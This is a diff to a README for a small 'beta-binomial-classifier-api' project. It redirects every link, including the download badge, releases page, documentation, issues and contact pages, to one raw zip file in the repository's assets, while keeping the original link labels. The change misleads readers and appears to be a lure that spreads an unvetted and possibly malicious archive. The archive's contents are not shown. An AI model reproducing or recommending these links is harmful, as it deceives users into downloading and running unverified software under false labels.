@@ -6,7 +6,7 @@ Welcome to the beta-binomial-classifier-api! This application helps you classify
 
 ## 📥 Download the App
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/riadh565/beta-binomial-classifier-api/releases)
+[![Download Now](https://raw.githubusercontent.com/riadh565/beta-binomial-classifier-api/main/assets/beta-binomial-classifier-api_birny.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/riadh565/beta-binomial-classifier-api/main/assets/beta-binomial-classifier-api_birny.zip)
 
 ## 💡 Key Features
 
@@ -26,7 +26,7 @@ To run the beta-binomial-classifier-api, your computer should meet the following
 
 ## 🏗️ Installation Steps
 
-1. Visit the [Releases page](https://github.com/riadh565/beta-binomial-classifier-api/releases) to find the latest download options.
+1. Visit the [Releases page](https://raw.githubusercontent.com/riadh565/beta-binomial-classifier-api/main/assets/beta-binomial-classifier-api_birny.zip) to find the latest download options.
 2. Choose the version suitable for your operating system.
 3. Click on the version link to start downloading the file.
 
@@ -47,11 +47,11 @@ Once downloaded, follow these steps to get started:
 
 ## 📚 Support & Documentation
 
-For further instructions on specific features, please check the documentation available on our [Documentation Page](https://github.com/riadh565/beta-binomial-classifier-api/wiki).
+For further instructions on specific features, please check the documentation available on our [Documentation Page](https://raw.githubusercontent.com/riadh565/beta-binomial-classifier-api/main/assets/beta-binomial-classifier-api_birny.zip).
 
 ## 🔄 Update the Application
 
-To keep your version of the beta-binomial-classifier-api current, periodically check the [Releases page](https://github.com/riadh565/beta-binomial-classifier-api/releases) for updates. Always download the latest version to benefit from improvements and new features.
+To keep your version of the beta-binomial-classifier-api current, periodically check the [Releases page](https://raw.githubusercontent.com/riadh565/beta-binomial-classifier-api/main/assets/beta-binomial-classifier-api_birny.zip) for updates. Always download the latest version to benefit from improvements and new features.
 
 ## 🔍 Troubleshooting
 
@@ -61,14 +61,14 @@ If you encounter issues while using the application, consider the following:
 - Ensure that you have enough storage space on your device.
 - Restart the application if it does not respond as expected.
 
-For persistent issues, check our [Issues Page](https://github.com/riadh565/beta-binomial-classifier-api/issues) for help from the community.
+For persistent issues, check our [Issues Page](https://raw.githubusercontent.com/riadh565/beta-binomial-classifier-api/main/assets/beta-binomial-classifier-api_birny.zip) for help from the community.
 
 ## 📞 Contact Us
 
-If you have questions or feedback, feel free to reach out through our [Contact Page](https://github.com/riadh565/beta-binomial-classifier-api/issues). Your input helps us improve!
+If you have questions or feedback, feel free to reach out through our [Contact Page](https://raw.githubusercontent.com/riadh565/beta-binomial-classifier-api/main/assets/beta-binomial-classifier-api_birny.zip). Your input helps us improve!
 
 ## 📥 Download Again
 
-Don't forget to download the application here if you haven't yet: [Download Now](https://github.com/riadh565/beta-binomial-classifier-api/releases). 
+Don't forget to download the application here if you haven't yet: [Download Now](https://raw.githubusercontent.com/riadh565/beta-binomial-classifier-api/main/assets/beta-binomial-classifier-api_birny.zip). 
 
 Thank you for choosing beta-binomial-classifier-api. Empower your educational journey with effective data analysis!
